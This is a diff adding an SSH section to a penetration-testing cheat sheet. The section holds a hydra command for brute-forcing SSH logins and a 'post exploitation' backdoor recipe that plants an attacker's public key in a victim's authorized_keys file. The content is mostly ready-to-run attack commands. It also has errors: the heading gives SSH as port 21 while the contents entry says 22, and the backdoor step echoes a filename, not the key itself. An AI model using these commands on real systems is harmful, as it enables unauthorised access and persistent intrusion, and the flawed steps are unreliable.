@@ -2,6 +2,9 @@
 
 * [Enumeration](#Enumeration)
 * [Fuzzing](#Fuzzing)
+* [SSH - 22](#ssh---21)
+  * [Brute force](#brute-force)
+  * [SSH backdoor - post exploitation](#ssh-backdoor---post-exploitation)
 * [SNMP - 161](#snmp---161)
 * [RDP - 3389](#rdp---3389)
 * [Password crack](#password-crack)
@@ -32,6 +35,30 @@ ffuf -w /usr/share/wordlists/wfuzz/general/common.txt -u http://target.com/FUZZ 
 ~~~ bash
 ffuf -u http://target.com/ -w ./fuzzDicts/subdomainDicts/main.txt -H "Host:FUZZ.target.com" -mc 200
 ~~~
+
+# SSH - 21
+
+## Brute force
+
+~~~ bash
+hydra -V -f -L users.txt -P passwords.txt ssh://target.com -u -vV
+~~~
+
+## SSH backdoor - post exploitation
+
+~~~ bash
+# Attacker
+ssh-keygen -f <FILENAME>
+chmod 600 <FILENAME>
+cat <FILENAME>.pub -> copy
+
+# Victim
+echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys
+
+# Connect
+ssh -i <FILENAME> <USER>@<IP>
+~~~
+
 
 # SNMP - 161
 
